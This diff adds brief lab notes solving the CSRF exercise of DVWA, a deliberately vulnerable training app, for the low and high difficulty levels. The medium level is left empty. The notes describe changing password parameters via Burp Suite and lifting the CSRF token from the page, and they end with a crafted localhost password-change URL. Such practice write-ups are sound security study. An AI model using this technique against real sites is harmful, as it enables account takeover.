@@ -1,0 +1,19 @@
+(Difficulty: Low)
+
+Open Burpsuite->Intercept
+Change the password & confirm_password from URL
+
+
+(Difficulty: Medium)
+
+
+
+
+(Difficulty: High)
+
+Inspect
+
+console-> 
+document.getElementsByName("user_token")					[get the Token & set this Token & manipulated Password in the URL]
+
+http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=pass&password_conf=pass&Change=Change&user_token=cf5c7c1ab7c2b10267fe75cf81d8c2fc#
